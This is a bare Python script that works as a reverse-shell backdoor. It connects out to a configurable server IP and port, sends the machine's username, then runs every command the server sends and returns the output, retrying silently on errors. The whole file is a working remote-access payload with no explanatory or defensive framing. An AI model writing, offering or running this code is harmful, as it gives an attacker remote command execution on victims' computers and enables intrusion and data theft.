import socket
import subprocess

# Set up the server address and port
server_address = '192.168.1.100'  # Replace with your server's IP address
server_port = 8080                # Replace with your server's port


# Connect to the server
while True:
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        break
    except:
        pass

while True:
    # Create a socket object
    username = subprocess.getoutput("""echo %username%""")

    try:
        client_socket.connect((server_address, server_port))
        client_socket.send(username.encode())

        # Receive commands from the server and execute them
        while True:
            command = client_socket.recv(1024).decode()
            if command.lower() == 'exit':
                break
            output = subprocess.getoutput(command)
            print(output)
            client_socket.send(output.encode())
    except:
        pass


